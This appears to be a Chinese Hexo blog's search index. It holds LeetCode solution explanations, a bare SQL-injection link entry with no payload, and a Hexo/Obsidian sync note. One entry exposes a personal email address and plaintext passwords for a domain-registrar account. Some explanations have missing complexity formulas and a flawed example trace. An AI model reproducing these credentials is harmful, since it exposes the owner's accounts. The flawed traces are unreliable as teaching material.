s[i:i + length]</span><br><span class="line">    sub_t_c = Counter(sub_s)</span><br><span class="line">    t_c = Counter(t)</span><br><span class="line">    if sub_t_c!= t_c:</span><br><span class="line">        flag = False</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>对于每个能整除总长度的长度<code>length</code>，先取出字符串<code>s</code>开头长度为<code>length</code>的子串<code>t</code>，然后通过一个内层<code>for</code>循环，以步长为<code>length</code>去依次取出后面同长度的子串<code>sub_s</code>。利用 Python 的<code>Counter</code>类来统计子串<code>sub_s</code>和<code>t</code>中每个字符出现的次数，比较它们是否相等。如果有任何一处不相等，说明当前长度的子串不能作为重复单元，将标志<code>flag</code>设为<code>False</code>并跳出内层循环。</p><ul><li><strong>返回结果</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if flag:</span><br><span class="line">    return length</span><br><span class="line">return n</span><br></pre></td></tr></table></figure><p>如果经过内层循环检查后，标志<code>flag</code>仍为<code>True</code>，说明找到了合适的最小重复单元长度，直接返回这个长度<code>length</code>；如果遍历完所有可能长度都没有找到合适的，那就返回整个字符串的长度<code>n</code>，意味着整个字符串本身就是那个不能再拆分的最小单元。</p><p>这个算法的时间复杂度是，其中<code>n</code>是输入字符串的长度，因为在最糟糕的情况下，我们需要对每个可能的子串长度（从 1 到<code>n</code>）去遍历整个字符串来检查子串是否符合条件。空间复杂度取决于<code>Counter</code>对象占用的空间，大致是，其中<code>m</code>是字符集的大小（本题中为小写英文字母个数 26），因为<code>Counter</code>统计的是不同字符出现的频次，最多会记录 26 种不同字符的频次情况。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21. 合并两个有序链表</title>
      <link href="/2024/12/30/21.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/"/>
      <url>/2024/12/30/21.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="一、题目概述"><a href="#一、题目概述" class="headerlink" title="一、题目概述"></a>一、题目概述</h3><p>本题要求将两个升序链表合并为一个新的升序链表，新链表由给定的两个链表的所有节点拼接而成</p><h3 id="二、代码实现"><a href="#二、代码实现" class="headerlink" title="二、代码实现"></a>二、代码实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Definition for singly-linked list.</span><br><span class="line"># class ListNode:</span><br><span class="line">#     def __init__(self, val=0, next=None):</span><br><span class="line">#         self.val = val</span><br><span class="line">#         self.next = next</span><br><span class="line">class Solution:</span><br><span class="line">    def mergeTwoLists(self, list1: Optional[ListNode], list2: Optional[ListNode]) -&gt; Optional[ListNode]:</span><br><span class="line">        # 创建虚拟头节点</span><br><span class="line">        dummy = ListNode()</span><br><span class="line">        current = dummy</span><br><span class="line"></span><br><span class="line">        # 比较并连接节点</span><br><span class="line">        while list1 and list2:</span><br><span class="line">            if list1.val &lt;= list2.val:</span><br><span class="line">                current.next = list1</span><br><span class="line">                list1 = list1.next</span><br><span class="line">            else:</span><br><span class="line">                current.next = list2</span><br><span class="line">                list2 = list2.next</span><br><span class="line">            current = current.next</span><br><span class="line"></span><br><span class="line">        # 处理剩余节点</span><br><span class="line">        if list1:</span><br><span class="line">            current.next = list1</span><br><span class="line">        if list2:</span><br><span class="line">            current.next = list2</span><br><span class="line"></span><br><span class="line">        return dummy.next</span><br></pre></td></tr></table></figure><h3 id="三、解题思路及步骤分析"><a href="#三、解题思路及步骤分析" class="headerlink" title="三、解题思路及步骤分析"></a>三、解题思路及步骤分析</h3><h4 id="（一）整体思路"><a href="#（一）整体思路" class="headerlink" title="（一）整体思路"></a>（一）整体思路</h4><p>通过依次比较两个链表中的节点值，将较小值的节点逐个连接到一个新创建的链表上，直至其中一个链表遍历完，再把剩余链表的节点全部连接到新链表的末尾，最终得到合并后的升序链表。</p><h4 id="（二）具体步骤"><a href="#（二）具体步骤" class="headerlink" title="（二）具体步骤"></a>（二）具体步骤</h4><ol><li><strong>创建虚拟头节点与指针初始化</strong>：<ul><li>首先创建一个虚拟头节点 <code>dummy</code>（值通常为默认值，如 0），它主要用于方便后续链表操作，并不属于最终有效的链表节点。</li><li>同时将指针 <code>current</code> 初始化为指向这个虚拟头节点，该指针会在后续构建新链表的过程中不断移动，用于确定新节点的连接位置。</li></ul></li><li><strong>比较并连接节点</strong>：<ul><li>在 <code>while list1 and list2:</code> 循环中：<ul><li>当 <code>list1.val &lt;= list2.val</code> 时：<ul><li>把 <code>list1</code> 当前节点连接到新链表（通过 <code>current.next = list1</code>），此时新节点连接在 <code>current</code> 所指节点之后。</li><li>然后将 <code>list1</code> 指针移动到下一个节点（<code>list1 = list1.next</code>），以便下一次比较。</li></ul></li><li>当 <code>list1.val &gt; list2.val</code>（即 <code>else</code> 分支）：<ul><li>把 <code>list2</code> 当前节点连接到新链表（<code>current.next = list2</code>）。</li><li>接着将 <code>list2</code> 指针移动到下一个节点（<code>list2 = list2.next</code>）。</li></ul></li><li>每次完成节点连接后，都要将 <code>current</code> 指针移动到新连接的节点上（<code>current = current.next</code>），这样才能在后续继续连接新的节点到正确位置。</li></ul></li></ul></li><li><strong>处理剩余节点</strong>：<ul><li>当 <code>while</code> 循环结束后，可能存在其中一个链表还有剩余节点的情况。</li><li>如果 <code>list1</code> 还有剩余节点（<code>if list1:</code>），就将 <code>list1</code> 剩余的所有节点连接到新链表的末尾（<code>current.next = list1</code>）。</li><li>同理，如果 <code>list2</code> 还有剩余节点（<code>if list2:</code>），则将 <code>list2</code> 剩余的所有节点连接到新链表的末尾（<code>current.next = list2</code>）。</li></ul></li><li><strong>返回合并后的链表</strong>：<ul><li>最后要返回的是合并后的升序链表，由于 <code>dummy</code> 是虚拟头节点，真正的合并后链表是从 <code>dummy</code> 下一个节点开始的，所以返回 <code>dummy.next</code>。注意最初若错误地返回 <code>current.next</code> 是不对的，因为 <code>current</code> 在处理完剩余节点后已经指向合并后链表的末尾，而不是起始节点。</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1249. 移除无效的括号</title>
      <link href="/2024/12/30/1249.%20%E7%A7%BB%E9%99%A4%E6%97%A0%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/"/>
      <url>/2024/12/30/1249.%20%E7%A7%BB%E9%99%A4%E6%97%A0%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>以下是对这段 Python 代码的详细讲解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">minRemoveToMakeValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># Parse 1: Remove all invalid &quot;)&quot;</span></span><br><span class="line">    first_parse_chars = []</span><br><span class="line">    balance = <span class="number">0</span></span><br><span class="line">    open_seen = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">            balance += <span class="number">1</span></span><br><span class="line">            open_seen += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> balance == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            balance -= <span class="number">1</span></span><br><span class="line">        first_parse_chars.append(c)</span><br></pre></td></tr></table></figure><ul><li>这段代码定义了一个名为 <code>minRemoveToMakeValid</code> 的方法，它接受一个字符串 <code>s</code> 作为输入，并返回一个修改后的字符串。</li><li>首先，创建了一个空列表 <code>first_parse_chars</code> 用于存储第一次处理后的字符。</li><li>初始化两个变量 <code>balance</code> 和 <code>open_seen</code>，<code>balance</code> 用于跟踪左右括号的平衡状态，<code>open_seen</code> 用于统计出现的左括号数量。</li><li>遍历输入字符串 <code>s</code> 中的每个字符 <code>c</code>：<ul><li>当字符 <code>c</code> 是 <code>(</code> 时，将 <code>balance</code> 和 <code>open_seen</code> 的值都加 1。这表示我们看到了一个左括号，并且增加了左括号的计数。</li><li>当字符 <code>c</code> 是 <code>)</code> 时：<ul><li>检查 <code>balance</code> 的值，如果 <code>balance</code> 为 0，说明此时的 <code>)</code> 是多余的，因为没有对应的左括号与之匹配，因此使用 <code>continue</code> 语句跳过将该 <code>)</code> 加入 <code>first_parse_chars</code> 列表。</li><li>如果 <code>balance</code> 不为 0，则将 <code>balance</code> 的值减 1，表示找到了一个匹配的左括号，将这个 <code>)</code> 加入 <code>first_parse_chars</code> 列表。</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Parse 2: Remove the rightmost &quot;(&quot;</span></span><br><span class="line">result = []</span><br><span class="line">open_to_keep = open_seen - balance</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> first_parse_chars:</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">        open_to_keep -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> open_to_keep &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    result.append(c)</span><br></pre></td></tr></table></figure><ul><li>在第二次解析中，我们要移除多余的左括号。</li><li>创建一个新的空列表 <code>result</code> 来存储最终的结果。</li><li>计算 <code>open_to_keep</code> 的值，它等于 <code>open_seen</code> 减去 <code>balance</code>。这个值表示最终应该保留的左括号数量。</li><li>再次遍历 <code>first_parse_chars</code> 列表中的每个字符 <code>c</code>：<ul><li>当字符 <code>c</code> 是 <code>(</code> 时，将 <code>open_to_keep</code> 的值减 1。</li><li>如果 <code>open_to_keep</code> 的值小于 0，说明这个左括号是多余的，使用 <code>continue</code> 跳过添加该字符到 <code>result</code> 列表。</li><li>否则，将该字符添加到 <code>result</code> 列表中。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br></pre></td></tr></table></figure><ul><li>最后，使用 <code>join</code> 方法将 <code>result</code> 列表中的字符拼接成一个字符串并返回。</li></ul><p><strong>代码逻辑总结</strong>：</p><ul><li>这段代码的主要目的是从输入字符串中移除最少的括号，使得剩余的括号是平衡的。</li><li>在第一次解析中，它移除了所有多余的右括号。通过 <code>balance</code> 变量，如果在遇到右括号时 <code>balance</code> 为 0，则说明该右括号是多余的，不添加到 <code>first_parse_chars</code> 列表。</li><li>在第二次解析中，根据第一次解析后的结果，计算应该保留的左括号数量 <code>open_to_keep</code>，并移除多余的左括号。</li><li>最终返回一个括号平衡的字符串。</li></ul><p><strong>示例</strong>：</p><ul><li>假设输入字符串 <code>s</code> 为 <code>()())()</code>。</li><li>在第一次解析中：<ul><li>当遍历到第一个 <code>(</code> 时，<code>balance</code> 变为 1，<code>open_seen</code> 变为 1，添加 <code>(</code> 到 <code>first_parse_chars</code>。</li><li>遇到第一个 <code>)</code> 时，<code>balance</code> 变为 0，添加 <code>)</code> 到 <code>first_parse_chars</code>。</li><li>遇到第二个 <code>)</code> 时，<code>balance</code> 为 0，跳过该 <code>)</code>。</li><li>遇到第三个 <code>)</code> 时，<code>balance</code> 为 0，跳过该 <code>)</code>。</li><li>遇到第二个 <code>(</code> 时，<code>balance</code> 变为 1，<code>open_seen</code> 变为 2，添加 <code>(</code> 到 <code>first_parse_chars</code>。</li><li>遇到最后一个 <code>)</code> 时，<code>balance</code> 变为 0，添加 <code>)</code> 到 <code>first_parse_chars</code>。</li><li>此时 <code>first_parse_chars</code> 为 <code>()()()</code>。</li></ul></li><li>在第二次解析中：<ul><li><code>open_to_keep</code> 为 <code>open_seen - balance</code> 即 <code>2 - 0 = 2</code>。</li><li>当遇到第一个 <code>(</code> 时，<code>open_to_keep</code> 变为 1。</li><li>当遇到第二个 <code>(</code> 时，<code>open_to_keep</code> 变为 0。</li><li>最终结果 <code>result</code> 为 <code>()()()</code>。</li></ul></li></ul><p>该代码通过两次解析和使用两个变量 <code>balance</code> 和 <code>open_to_keep</code> 有效地实现了从字符串中移除最少的括号以保证括号平衡的功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20. 有效的括号</title>
      <link href="/2024/12/30/20.%20%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/"/>
      <url>/2024/12/30/20.%20%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"></span><br><span class="line">        dic = &#123;<span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,  <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> dic:</span><br><span class="line"></span><br><span class="line">                stack.append(c)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> dic[stack.pop()] != c:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(stack) == <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>一、代码整体功能</strong>：<br>这段代码定义了一个名为 <code>Solution</code> 的类，其中包含一个名为 <code>isValid</code> 的方法，该方法用于检查输入的字符串 <code>s</code> 是否是一个有效的括号序列。有效括号序列是指，每个左括号都能找到与之匹配的右括号，并且它们的顺序是正确的。</p><p><strong>二、代码结构分析</strong>：</p><ol><li><p><strong>字典 <code>dic</code> 的创建</strong>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,  <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;?&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p> 这个字典存储了左括号作为键，右括号作为对应的值。这里添加了一个特殊的键值对 <code>&#39;?&#39; : &#39;?&#39;</code>，是为了在初始化栈时，防止栈为空而导致的 <code>pop</code> 操作错误。</p></li><li><p><strong>栈 <code>stack</code> 的初始化</strong>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack = [<span class="string">&#x27;?&#x27;</span>]</span><br></pre></td></tr></table></figure><p> 栈是用来存储左括号的。初始化时将 <code>&#39;?&#39;</code> 压入栈中，主要是为了避免在后面的操作中，对空栈进行 <code>pop</code> 操作而引发异常。</p></li><li><p><strong>遍历输入字符串 <code>s</code></strong>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br></pre></td></tr></table></figure><p> 使用 <code>for</code> 循环遍历输入字符串中的每个字符。</p></li><li><p><strong>处理左括号</strong>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> dic:</span><br><span class="line">    stack.append(c)</span><br></pre></td></tr></table></figure><p> 如果当前字符 <code>c</code> 是字典 <code>dic</code> 中的键（即左括号），将其压入栈 <code>stack</code> 中。</p></li><li><p><strong>处理右括号并检查匹配性</strong>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> dic[stack.pop()]!= c:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p> 如果当前字符 <code>c</code> 不是左括号，那么它应该是右括号。此时从栈中弹出一个元素，使用 <code>stack.pop()</code> 方法，并通过 <code>dic[stack.pop()]</code> 查找其对应的右括号，将其与当前字符 <code>c</code> 比较。如果不相等，说明不匹配，返回 <code>False</code>。</p></li><li><p><strong>最终检查</strong>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(stack) == <span class="number">1</span></span><br></pre></td></tr></table></figure><p> 当遍历完字符串 <code>s</code> 后，栈中应该只留下初始添加的 <code>&#39;?&#39;</code> 元素，此时栈的长度为 1。如果长度不为 1，说明存在未匹配的左括号，返回 <code>False</code>；如果长度为 1，则认为输入的括号序列是有效的，返回 <code>True</code>。</p></li></ol><p><strong>三、总结</strong>：<br>这段代码利用栈和字典的数据结构，巧妙地实现了对括号序列有效性的检查。通过将左括号压入栈中，遇到右括号时从栈中弹出相应的左括号进行匹配检查，最终根据栈的状态来判断括号序列是否有效。这种方法的时间复杂度是 $O(n)$，因为需要遍历输入字符串中的每个字符。空间复杂度主要取决于栈的最大长度，最坏情况下为 $O(n)$，因为可能将整个输入字符串中的左括号都压入栈中。</p><p>以下是一个使用示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.isValid(<span class="string">&quot;()[]&#123;&#125;&quot;</span>))  <span class="comment"># 输出: True</span></span><br><span class="line"><span class="built_in">print</span>(sol.isValid(<span class="string">&quot;([)]&quot;</span>))  <span class="comment"># 输出: False</span></span><br></pre></td></tr></table></figure><br>在这个示例中，首先创建了 <code>Solution</code> 类的实例 <code>sol</code>，然后调用 <code>isValid</code> 方法，分别传入不同的字符串，检查它们是否是有效的括号序列。对于 <code>&quot;()[]&#123;&#125;&quot;</code> 这个字符串，左括号和右括号都能正确匹配，所以返回 <code>True</code>；而对于 <code>&quot;([)]&quot;</code> 这个字符串，由于括号的匹配顺序错误，返回 <code>False</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2545. 根据第 K 场考试的分数排序</title>
      <link href="/2024/12/30/2545.%20%E6%A0%B9%E6%8D%AE%E7%AC%AC%20K%20%E5%9C%BA%E8%80%83%E8%AF%95%E7%9A%84%E5%88%86%E6%95%B0%E6%8E%92%E5%BA%8F/"/>
      <url>/2024/12/30/2545.%20%E6%A0%B9%E6%8D%AE%E7%AC%AC%20K%20%E5%9C%BA%E8%80%83%E8%AF%95%E7%9A%84%E5%88%86%E6%95%B0%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>班里有 <code>m</code> 位学生，共计划组织 <code>n</code> 场考试。给你一个下标从 <strong>0</strong> 开始、大小为 <code>m x n</code> 的整数矩阵 <code>score</code> ，其中每一行对应一位学生，而 <code>score[i][j]</code> 表示第 <code>i</code> 位学生在第 <code>j</code> 场考试取得的分数。矩阵 <code>score</code> 包含的整数 <strong>互不相同</strong> 。</p><p>另给你一个整数 <code>k</code> 。请你按第 <code>k</code> 场考试分数从高到低完成对这些学生（矩阵中的行）的排序。</p><p>返回排序后的矩阵。</p><p><strong>示例 1：</strong></p><p><img src="https://assets.leetcode.com/uploads/2022/11/30/example1.png" alt=""></p><p><strong>输入：</strong>score = [[10,6,9,1],[7,5,11,2],[4,8,3,15]], k = 2<br><strong>输出：</strong>[[7,5,11,2],[10,6,9,1],[4,8,3,15]]<br><strong>解释：</strong>在上图中，S 表示学生，E 表示考试。</p><ul><li>下标为 1 的学生在第 2 场考试取得的分数为 11 ，这是考试的最高分，所以 TA 需要排在第一。</li><li>下标为 0 的学生在第 2 场考试取得的分数为 9 ，这是考试的第二高分，所以 TA 需要排在第二。</li><li>下标为 2 的学生在第 2 场考试取得的分数为 3 ，这是考试的最低分，所以 TA 需要排在第三。</li></ul><p><strong>示例 2：</strong></p><p><img src="https://assets.leetcode.com/uploads/2022/11/30/example2.png" alt=""></p><p><strong>输入：</strong>score = [[3,4],[5,6]], k = 0<br><strong>输出：</strong>[[5,6],[3,4]]<br><strong>解释：</strong>在上图中，S 表示学生，E 表示考试。</p><ul><li>下标为 1 的学生在第 0 场考试取得的分数为 5 ，这是考试的最高分，所以 TA 需要排在第一。</li><li>下标为 0 的学生在第 0 场考试取得的分数为 3 ，这是考试的最低分，所以 TA 需要排在第二。</li></ul><p><strong>提示：</strong></p><ul><li><code>m == score.length</code></li><li><code>n == score[i].length</code></li><li><code>1 &lt;= m, n &lt;= 250</code></li><li><code>1 &lt;= score[i][j] &lt;= 105</code></li><li><code>score</code> 由 <strong>不同</strong> 的整数组成</li><li><code>0 &lt;= k &lt; n</code><br>以下是使用Python语言解决上述问题的代码实现：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sortTheStudents</span>(<span class="params">score, k</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(score, key=<span class="keyword">lambda</span> x: -x[k])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你可以使用以下方式调用这个函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">score = [[<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>], [<span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">2</span>], [<span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">15</span>]]</span><br><span class="line">k = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(sortTheStudents(score, k))</span><br></pre></td></tr></table></figure></p><p>以下是对上述代码的解释：</p><h3 id="1-整体思路"><a href="#1-整体思路" class="headerlink" title="1. 整体思路"></a>1. 整体思路</h3><p>题目要求按照第<code>k</code>场考试的分数对学生（矩阵中的行）进行从高到低的排序。Python中的内置函数<code>sorted</code>提供了很方便的排序功能，我们只需要指定合适的排序关键字（<code>key</code>参数），让其按照每个子列表（代表每个学生的成绩列表）中索引为<code>k</code>的元素（即第<code>k</code>场考试的成绩）来进行排序，并且通过取负号来实现从高到低的降序排序效果。</p><h3 id="2-代码详细分析"><a href="#2-代码详细分析" class="headerlink" title="2. 代码详细分析"></a>2. 代码详细分析</h3><ul><li><p><strong>函数定义和参数</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sortTheStudents</span>(<span class="params">score, k</span>):</span><br></pre></td></tr></table></figure><p>定义了名为<code>sortTheStudents</code>的函数，它接受两个参数，<code>score</code>是表示学生成绩的二维矩阵（列表的列表形式），<code>k</code>表示按照哪一场考试的成绩来进行排序的索引值（从0开始计数）。</p></li><li><p><strong>使用<code>sorted</code>函数排序</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">sorted</span>(score, key=<span class="keyword">lambda</span> x: -x[k])</span><br></pre></td></tr></table></figure><p>这里调用了Python的内置函数<code>sorted</code>对<code>score</code>进行排序。<code>sorted</code>函数会返回一个新的已排好序的列表，不会改变原列表。其中<code>key</code>参数指定了排序的依据，这里使用了一个匿名函数（<code>lambda</code>表达式）<code>lambda x: -x[k]</code>，对于传入的参数<code>x</code>（这里<code>x</code>代表<code>score</code>中的每一行，也就是每个学生的成绩列表），返回<code>-x[k]</code>，意味着按照每个学生成绩列表中索引为<code>k</code>的成绩取负后的值来进行排序。取负的操作使得原本数值大的成绩在排序时会排在前面，从而实现从高到低的排序效果。</p></li></ul><p>该算法的时间复杂度取决于Python内置<code>sorted</code>函数的实现，一般对于长度为<code>m</code>的可迭代对象（这里是学生的数量）进行排序，时间复杂度接近 $O(m \log m)$，空间复杂度大致为 $O(m)$，因为需要额外的空间来存储排序后的结果（新的已排序列表）。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2024/12/30/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/30/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><a href="整数型SQL注入.md">整数型SQL注入</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>US.KG域名</title>
      <link href="/2024/12/30/US.KG%E5%9F%9F%E5%90%8D/"/>
      <url>/2024/12/30/US.KG%E5%9F%9F%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<p><a href="https://register.us.kg/">https://register.us.kg/</a><br>账户:2176891692@qq.com<br>密码:LIANg0122<br>mikufun.us.kg<br><em>您的已分配的 Cloudflare 名称服务器：</em><br>frida.ns.cloudflare.com<br>nick.ns.cloudflare.com<br>PASSWORD:051122</p><p><img src="/assets/Pasted%20image%2020241214164718.png" alt=""><img src="/assets/Pasted%20image%2020241214164730.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> HEXO管理系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO管理系统</title>
      <link href="/2024/12/30/HEXO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/12/30/HEXO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h1><h2 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h2><ul><li>hexo根目录<ul><li>F:\HEXO\mikufun</li></ul></li><li>hexo的assets目录<ul><li>F:\HEXO\mikufun\themes\anzhiyu\source\assets</li></ul></li><li>hexo的_post目录<ul><li>F:\HEXO\mikufun\source_posts</li></ul></li><li>obsidan根目录<ul><li>F:\OneDrive - MSFT\薛谔的obsidian库</li></ul></li><li>obsidian的assets目录<ul><li>F:\OneDrive - MSFT\薛谔的obsidian库\assets<h2 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h2>遍历obsidian根目录下的所有markdown文章,查看他们的yaml front matter,把他们的title和tag属性全删掉,然后把文章的文件名当作title写进去,把文章所在文件夹的名字当作tag写入,如果文章在obsidan根目录,那就不用再需要写他们的tag,删掉title和tag后把文章的文件名当作title添加上就行</li></ul></li></ul><p>先把hexo的_post目录F:\HEXO\mikufun\source_posts下的内容全删了,然后遍历obsidan根目录 F:\OneDrive - 